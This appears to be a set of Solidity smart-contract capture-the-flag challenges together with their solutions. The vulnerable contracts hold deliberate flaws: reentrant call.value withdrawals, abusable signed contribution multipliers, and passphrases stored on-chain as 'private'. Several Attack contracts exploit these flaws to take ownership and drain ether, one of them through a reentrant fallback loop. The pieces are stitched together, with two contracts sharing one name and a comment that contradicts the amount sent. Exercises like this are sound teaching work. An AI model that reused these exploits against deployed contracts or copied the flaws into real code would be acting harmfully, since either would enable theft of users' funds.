pragma solidity = 0.4.25;

contract Multipass {
    address public owner;
    uint256 public money;
    
    mapping(address => int256) public contributions;
    
    bool public withdrawn;
    
    constructor() public payable {
        contributions[msg.sender] = int256(msg.value * 900000000000000000000);
        owner = msg.sender;
        money = msg.value;
        withdrawn = false;
    }
    
    function gift() public payable {
        require(contributions[msg.sender] == 0 && msg.value == 0.00005 ether);
        contributions[msg.sender] = int256(msg.value) * 10;
        money += msg.value;
    }
  
    function takeSomeMoney() public {
        require(msg.sender == owner && withdrawn == false);
        uint256 someMoney = money/20;
        if(msg.sender.call.value(someMoney)()){
            money -= someMoney;
        }
        withdrawn = true;
    }
    
    function contribute(int256 _factor) public {
        require(contributions[msg.sender] != 0 && _factor < 10);
        contributions[msg.sender] *= _factor;
    }
    
    function claimContract() public {
        require(contributions[msg.sender] > contributions[owner]);
        owner = msg.sender;
    }
}

pragma solidity = 0.4.25;

contract Logic {
    address public owner;
    bytes32 private passphrase = "th3 fl4g 1s n0t h3r3";
    
    constructor() public payable {
        owner = msg.sender;  
    }
    
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.call.value(address(this).balance)();
    }

    function claim(bytes32 _secret) public payable {
        require(msg.value == 0.05 ether && _secret == passphrase);
        owner = msg.sender;
    }
}

contract Attack {
    Multipass public target;
    
    constructor(address _adress) public payable{
        target = Multipass(_adress);
        target.gift.value(0.00005 ether)();
    }
    
    function multiplyContributions() public {
        address contractAdress = address(this);
        
        while (target.contributions(contractAdress) <= target.contributions(target.owner())) {
            target.contribute(9);
        }
    }
    
    function takeOwnership() public returns(address){
        multiplyContributions();
        target.claimContract();
    }
    
    function attack() public {
        takeOwnership();
        target.takeSomeMoney();
    }
    
    function () payable public {
        while (!target.withdrawn()) {
            target.takeSomeMoney();
        }
    }
}

contract Attack {
    Guessing public target;
    
    constructor (address _adress) public {
        target = Guessing(_adress);
    }
    
    function attack() public pure returns(bytes) {
        bytes32 _passphrase = "I'm pr3tty sur3 y0u brut3f0rc3d!";
        bytes  memory output = abi.encodePacked(_passphrase);
        return output;
    }
}

pragma solidity = 0.4.25;

contract Guessing {
    address public owner;    
    bytes32 private passphrase;
    
    constructor(bytes32 _passphrase) public payable {
        owner = msg.sender;
        passphrase = keccak256(abi.encodePacked(_passphrase));
    }
    
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.call.value(address(this).balance)();
    }

    function claim(bytes32 _secret) public payable {
        require(keccak256(abi.encodePacked(_secret)) == passphrase);
        owner = msg.sender; 
    }
}

pragma solidity = 0.4.25;

contract Warmup {
    bool public locked;
    
    constructor() public payable {
        locked = true;
    }
    
    function unlock() public payable {
        require(msg.value == 0.005 ether);
        locked = false;
    }
    
    function withdraw() public payable {
        require(!locked);
        msg.sender.call.value(address(this).balance)();
    }
}

contract Attack {
    Logic public target;
    
     constructor (address _adress) public {
        target = Logic(_adress);
    }
    
     function attack() public payable {
        bytes32 passphrase = "th3 fl4g 1s n0t h3r3";
        
        // We send the 0.005 ether to the target
        target.claim.value(0.05 ether)(passphrase);
        
        // Once it is unlocked we withdraw the money;
        target.withdraw();
    }
}

